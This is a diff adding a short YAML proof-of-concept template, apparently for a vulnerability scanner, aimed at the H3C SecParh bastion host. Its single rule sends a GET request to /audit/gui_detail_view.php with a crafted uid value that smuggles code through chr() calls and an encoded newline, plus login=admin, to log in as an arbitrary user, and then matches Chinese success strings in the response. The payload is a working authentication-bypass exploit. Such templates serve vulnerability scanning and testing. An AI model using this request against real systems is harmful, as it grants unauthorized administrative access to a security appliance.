@@ -1,0 +1,10 @@
+name: poc-yaml-h3c-secparh-any-user-login
+rules:
+  - method: GET
+    path: "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin"
+    expression: |
+      response.status == 200 && ("错误的id".bmatches(response.body) || "审计管理员".bmatches(response.body))
+detail:
+  author: Print1n(https://print1n.top)
+  links:
+    - https://www.pwnwiki.org/index.php?title=H3C_SecParh%E5%A0%A1%E5%A3%98%E6%A9%9F_get_detail_view.php_%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B6%E7%99%BB%E9%8C%84%E6%BC%8F%E6%B4%9E
